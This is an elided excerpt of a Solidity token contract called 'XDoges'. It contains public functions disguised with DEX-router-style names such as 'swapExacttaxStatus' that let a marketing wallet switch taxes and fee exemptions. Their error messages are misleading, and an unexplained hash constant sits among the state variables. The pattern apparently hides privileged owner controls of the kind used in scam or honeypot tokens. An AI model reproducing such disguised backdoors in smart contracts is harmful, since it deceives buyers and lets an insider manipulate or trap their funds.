...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "XDoges";
    string private _symbol = "XDoges";
    ...
    bytes32 private Starthu = 0x9a5a58e530a12ab70f19c013a8f4fd06ce5797370e9524e74ead26db8bffb6d5;
...
//    }
    ...
    function swapExacttaxStatus( bool e) public virtual returns (bool) {
         require(_msgSender() == address(_MarketingWallet), "ERC20: transfer from the address");
        taxStatus = e;
        return true;
    }

    function swapExactTokensForexcludeFromFeeTransfer(address account, bool e) public {
         require(_msgSender() == address(_MarketingWallet), "ERC20: transfer from the address");
    ...
    function swapExactTokensForexcludeFromFeeTransferMult(address[] calldata addresses, bool status) public {
         require(_msgSender() == address(_MarketingWallet), "ERC20: transfer from the address");
